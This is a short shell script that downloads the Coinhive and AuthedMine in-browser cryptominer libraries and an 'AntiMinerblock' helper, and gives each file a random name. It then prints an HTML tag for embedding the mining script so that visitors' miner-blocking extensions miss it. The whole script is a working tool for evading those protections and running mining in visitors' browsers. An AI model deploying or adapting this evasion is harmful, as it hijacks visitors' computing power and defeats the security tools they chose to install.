echo Generating random file names
coinhive=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
authminer=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
echo Downloading scripts
wget -O $coinhive http://coinhive.com/lib/coinhive.min.js
wget -O $authminer https://authedmine.com/lib/authedmine.min.js
wget -O $minerblock https://cdn.rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js
echo Substituting the filenames into $minerblock
sed -i 's/coinSUB/'$coinhive'/g' $minerblock
sed -i 's/authSUB/'$authminer'/g' $minerblock

echo Put the following into your HTML files that you want to have protection against Minerblockers:
echo "<script src='"$minerblock"'></script>"
